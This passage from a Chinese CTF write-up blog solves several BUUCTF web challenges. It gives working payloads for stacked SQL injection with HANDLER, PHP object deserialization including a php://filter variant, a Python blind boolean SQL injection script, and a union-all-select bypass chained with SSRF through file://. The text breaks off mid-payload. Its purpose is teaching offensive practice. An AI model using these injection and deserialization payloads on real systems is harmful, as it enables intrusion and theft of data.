CLOSE<br>关闭打开的句柄</li><li>HANDLER tbl_name READ index_name&#x3D;value<br>通过索引列指定一个值，可以指定从哪一行开始，通过NEXT继续浏览。</li></ol><p>输入</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>&#x27;;handler FlagHere <span class="hljs-keyword">open</span>;handler FlagHere <span class="hljs-keyword">read</span> first;handler FlagHere <span class="hljs-keyword">close</span><span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><p><img src="/images/Q560M.png"><br>成功</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>经过分析，这个题目需要传入一个序列化之后的类对象，并且要绕过两层防护：</p><p><strong>两个防护</strong></p><p><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascli值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00,不符合上面的要求。</p><p><strong>绕过方法：</strong>因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</p><p><strong>destruct()魔术方法</strong><br>op&#x3D;&#x3D;&#x3D;”2”，是强比较</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure><p>而在process()函数中，op&#x3D;&#x3D;”2”是弱比较</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>            $<span class="hljs-keyword">this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>所以可以使传入的op为数字2，从而使第一个强比较返回false，而使第二个弱比较返回true</p><p><strong>本地进行序列化操作</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>序列化结果：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p><p>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p><p>查看源码找到flag</p><p>也可以使用伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;2&quot;</span>;<br> <br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用过base64解码得到flag</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’<br>确定表和字段</p><p>随便输入<br>查询1，2会有回显，其它的会显示错误<br>id&#x3D;1 Hello, glzjin wants a girlfriend.<br>id&#x3D;2 Do you want to be my girlfriend?<br>输入if(true,1,2) 返回Hello, glzjin wants a girlfriend.<br>输入if(false,1,2) 返回Do you want to be my girlfriend?</p><p>可以用这种方法判断flag的值<br>写一个脚本(要用到time.sleep，以防出现429错误，这个脚本有个小问题就是它不能匹配<code>-</code>，所以要在空缺的地方把<code>-</code>补好，在我的机器中time.sleep()最好的设置为0.1-0.4，因为到了后面仍然不会显示<code>-</code>)<br><strong>429错误</strong>：表示客户端发送的请求过多，超出了服务器的处理能力或限制。 它是一种反应速率限制的状态码，用于告知客户端暂时无法处理请求。 在实际应用中，当收到429状态码时，客户端应该采取措施减少请求频率或优化代码，以降低服务器的负载。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br><br><span class="hljs-attribute">s</span>=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,60):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://becd3bf4-4a7a-41db-af52-6bc45f25b20e.node4.buuoj.cn:81/index.php&quot;</span><br>        <span class="hljs-attribute">sqls</span>=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.format(i,j)<br>        #<span class="hljs-built_in">print</span>(i)<br>        #<span class="hljs-built_in">print</span>(sqls)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,<span class="hljs-attribute">data</span>=data)<br>        #<span class="hljs-built_in">print</span>(c.text)<br>        time.sleep(1.0)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>看到注册首先想到了存储型xss，一顿x返回的PHPSESSID并没有什么用<br>正常注册blog就填<code>www.baidu.com</code>把<br>自动跳转到下一个页面后，可以发现username是一个超链接<br>点击进入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c5d58095-<span class="hljs-number">7</span>b7c-<span class="hljs-number">4</span>cad-b014-<span class="hljs-number">237</span>ca4cccdcf.node4.buuoj.cn:<span class="hljs-number">81</span>/view.php?no=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>疑似SQL注入<br>过滤了union select,用union all select绕过<br>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,data,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure><p>username列返回<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </code></p><p>属于是被序列化了，那应该还有我们应该知道的源代码没有找到<br>dirsearch扫一扫<br>扫出这么几个能用的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/db.php<br>/error.php<br>/flag.php<br>/login.php<br>/robots.txt<br>/view.php<br></code></pre></td></tr></table></figure><p>进入&#x2F;robots.txt找到&#x2F;user.php.bak<br>下载<br>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//初始化一个cURL会话</span><br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//为给定的cURL会话句柄设置一个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<span class="hljs-comment">//执行给定的cURL会话</span><br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-comment">//获取一个cURL连接资源句柄的信息</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>需要了解的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>   &#123;<br>       <span class="hljs-variable">$ch</span> = curl_init();<span class="hljs-regexp">//</span>初始化一个cURL会话<br><br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-regexp">//</span>为给定的cURL会话句柄设置一个选项<br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<span class="hljs-regexp">//</span>执行给定的cURL会话<br>       <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-regexp">//</span>获取一个cURL连接资源句柄的信息<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>           return <span class="hljs-number">404</span>;<br>       &#125;<br>       curl_close(<span class="hljs-variable">$ch</span>);<br><br>       return <span class="hljs-variable">$output</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure><ul><li>curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</li><li>curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</li><li>CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出</li><li>curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</li><li>CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。<br>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</li></ul><p>如果状态码不是404，就返回exec的结果。<br>get函数在getBlogContents()里被调用，传参为blog<br>给参数赋个值，反序列化看看flag.php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new UserInfo();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">age</span>=12;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">blog</span>=<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br>echo serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span 